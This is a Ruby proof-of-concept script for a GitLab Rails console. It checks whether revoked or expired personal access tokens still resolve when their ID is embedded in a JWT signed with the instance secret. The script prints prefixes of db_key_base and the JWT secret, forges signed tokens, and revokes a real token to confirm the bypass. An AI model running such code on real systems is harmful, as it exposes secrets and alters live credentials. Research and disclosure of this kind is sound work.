# Comprehensive Test: What Knowledge is Required to Exploit JWT Vulnerability
# Run this in your GitLab Rails console: rails console

puts "=== JWT Vulnerability Requirements Analysis ==="
puts ""

# Test 1: Check JWT Secret Generation
puts "1. JWT Secret Key Analysis:"
puts "   JWT secret is derived from:"
puts "   - Gitlab::Encryption::KeyProvider[:db_key_base].encryption_key.secret"
puts "   - HMAC_KEY = 'gitlab-jwt'"
puts "   - HMAC_ALGORITHM = 'SHA256'"
puts ""

# Test 2: Check if db_key_base is accessible
puts "2. Checking db_key_base accessibility:"
begin
  db_key_base = Gitlab::Encryption::KeyProvider[:db_key_base].encryption_key.secret
  puts "   ✅ db_key_base is accessible: #{db_key_base[0..10]}..."
  puts "   ✅ Length: #{db_key_base.length} characters"
rescue => e
  puts "   ❌ db_key_base not accessible: #{e.message}"
end
puts ""

# Test 3: Check JWT secret generation
puts "3. Checking JWT secret generation:"
begin
  jwt_secret = Gitlab::JWTToken.secret
  puts "   ✅ JWT secret is accessible: #{jwt_secret[0..10]}..."
  puts "   ✅ Length: #{jwt_secret.length} characters"
rescue => e
  puts "   ❌ JWT secret not accessible: #{e.message}"
end
puts ""

# Test 4: Test JWT token creation with known token ID
puts "4. Testing JWT token creation:"
begin
  # Get a valid token ID
  existing_token = PersonalAccessToken.first
  if existing_token
    puts "   Using existing token ID: #{existing_token.id}"
    
    # Create JWT payload
    payload = {
      'token' => existing_token.id,
      'iat' => Time.now.to_i,
      'exp' => Time.now.to_i + 300,  # 5 minutes
      'jti' => SecureRandom.uuid
    }
    
    # Create JWT token
    jwt_token = JWT.encode(payload, Gitlab::JWTToken.secret, 'HS256')
    puts "   ✅ JWT token created successfully"
    puts "   ✅ Token length: #{jwt_token.length} characters"
    
    # Test JWT decoding
    decoded = Gitlab::JWTToken.decode(jwt_token)
    if decoded
      puts "   ✅ JWT token decodes successfully"
      puts "   ✅ Token ID in JWT: #{decoded['token']}"
    else
      puts "   ❌ JWT token decode failed"
    end
  else
    puts "   ❌ No existing tokens found"
  end
rescue => e
  puts "   ❌ JWT creation failed: #{e.message}"
end
puts ""

# Test 5: Test the vulnerable code path
puts "5. Testing vulnerable code path:"
begin
  if existing_token
    # Create JWT with token ID
    payload = {
      'token' => existing_token.id,
      'iat' => Time.now.to_i,
      'exp' => Time.now.to_i + 300,
      'jti' => SecureRandom.uuid
    }
    jwt_token = JWT.encode(payload, Gitlab::JWTToken.secret, 'HS256')
    
    # Simulate the vulnerable resolution
    def test_vulnerable_resolution(jwt_token)
      begin
        # Step 1: Decode JWT
        jwt_payload = Gitlab::JWTToken.decode(jwt_token)
        return nil unless jwt_payload
        
        # Step 2: Check token ID type
        return nil unless jwt_payload['token'].is_a?(Integer)
        
        # Step 3: Find token by ID (VULNERABLE - no state validation)
        pat = PersonalAccessToken.find(jwt_payload['token'])
        return pat
      rescue => e
        puts "     ❌ Error: #{e.message}"
        return nil
      end
    end
    
    result = test_vulnerable_resolution(jwt_token)
    if result
      puts "   ✅ Vulnerable path works!"
      puts "   ✅ Found token: #{result.id} (User: #{result.user.username})"
      puts "   ✅ Token revoked: #{result.revoked?}"
      puts "   ✅ Token expired: #{result.expired?}"
    else
      puts "   ❌ Vulnerable path failed"
    end
  end
rescue => e
  puts "   ❌ Test failed: #{e.message}"
end
puts ""

# Test 6: Test with revoked token
puts "6. Testing with revoked token:"
begin
  if existing_token
    # Revoke the token
    existing_token.revoke!
    puts "   ✅ Token revoked: #{existing_token.revoked?}"
    
    # Create JWT with revoked token ID
    payload = {
      'token' => existing_token.id,
      'iat' => Time.now.to_i,
      'exp' => Time.now.to_i + 300,
      'jti' => SecureRandom.uuid
    }
    jwt_token = JWT.encode(payload, Gitlab::JWTToken.secret, 'HS256')
    
    # Test vulnerable path with revoked token
    result = test_vulnerable_resolution(jwt_token)
    if result
      puts "   ✅ VULNERABILITY CONFIRMED!"
      puts "   ✅ Revoked token still works via JWT!"
      puts "   ✅ Token ID: #{result.id}"
      puts "   ✅ Token revoked: #{result.revoked?}"
    else
      puts "   ❌ Revoked token correctly rejected"
    end
  end
rescue => e
  puts "   ❌ Revoked token test failed: #{e.message}"
end
puts ""

puts "=== CONCLUSION ==="
puts ""
puts "To exploit this vulnerability, you need:"
puts "1. ✅ A valid token ID (obtained through information disclosure, etc.)"
puts "2. ✅ Access to GitLab's JWT secret key (via db_key_base)"
puts "3. ✅ Ability to create properly signed JWT tokens"
puts ""
puts "The vulnerability allows bypassing token revocation/expiration"
puts "by embedding the token ID in a JWT token, even if the original"
puts "token has been revoked or expired."